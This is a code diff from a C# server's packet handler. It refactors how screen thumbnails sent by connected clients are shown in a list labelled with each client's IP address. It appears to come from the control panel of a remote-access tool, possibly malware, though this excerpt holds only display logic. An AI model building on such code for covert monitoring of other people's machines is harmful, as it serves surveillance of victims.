@@ -1,5 +1,5 @@
 ﻿using Server.MessagePack;
-using Server.Sockets;
+using Server.Connection;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
@@ -13,37 +13,31 @@ namespace Server.Handle_Packet
         {
             try
             {
-                if (Program.form1.listView3.InvokeRequired)
+                if (client.LV2 == null && Program.form1.GetThumbnails.Tag == (object)"started")
                 {
-                    Program.form1.listView3.BeginInvoke((MethodInvoker)(() =>
+                    client.LV2 = new ListViewItem();
+                    client.LV2.Text = string.Format("{0}:{1}", client.TcpClient.RemoteEndPoint.ToString().Split(':')[0], client.TcpClient.LocalEndPoint.ToString().Split(':')[1]);
+                    client.LV2.ToolTipText = client.ID;
+                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                     {
-                        if (client.LV2 == null && Program.form1.GetThumbnails.Tag == (object)"started")
+                        Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
+                        client.LV2.ImageKey = client.ID;
+                        lock (Settings.Listview3Lock)
                         {
-                            client.LV2 = new ListViewItem();
-                            client.LV2.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
-                            client.LV2.ToolTipText = client.ID;
-                            using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
-                            {
-                                Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
-                                client.LV2.ImageKey = client.ID;
-                                lock (Settings.Listview3Lock)
-                                {
-                                    Program.form1.listView3.Items.Add(client.LV2);
-                                }
-                            }
+                            Program.form1.listView3.Items.Add(client.LV2);
                         }
-                        else
+                    }
+                }
+                else
+                {
+                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
+                    {
+                        lock (Settings.Listview3Lock)
                         {
-                            using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
-                            {
-                                lock (Settings.Listview3Lock)
-                                {
-                                    Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
-                                    Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
-                                }
-                            }
+                            Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
+                            Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                         }
-                    }));
+                    }
                 }
             }
             catch { }
